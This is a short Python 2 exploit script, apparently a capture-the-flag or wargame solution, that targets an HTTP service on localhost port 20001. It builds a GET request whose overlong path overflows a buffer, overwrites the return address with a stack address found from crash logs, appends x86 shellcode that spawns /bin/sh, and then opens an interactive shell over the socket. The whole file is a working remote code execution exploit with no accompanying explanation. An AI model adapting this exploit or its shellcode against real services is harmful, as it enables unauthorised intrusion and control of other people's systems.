import struct
import socket
import telnetlib

shell = "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

def create(address):
	request = "GET "
	version = " HTTP/1.1"
	path = "A"*(128 + 12 - 1) # -1 for alignment because realpath prepends "/" to the buffer

	offset = len(request + path + version) + 4
	path += struct.pack("I", address + 24 + offset) # +24 points to the buffer

	payload = request + path + version
	payload += shell
	payload += "B"*(1024 - len(payload))

	return payload

HOST = "127.0.0.1"
PORT = 20001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# address = 0x0804b42c # address of execve@plt
address = 0xbff01a60 # address found at `dmesg | tail -n1` whenever crashes
payload = create(address)

print "Sending payload: " + payload
s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
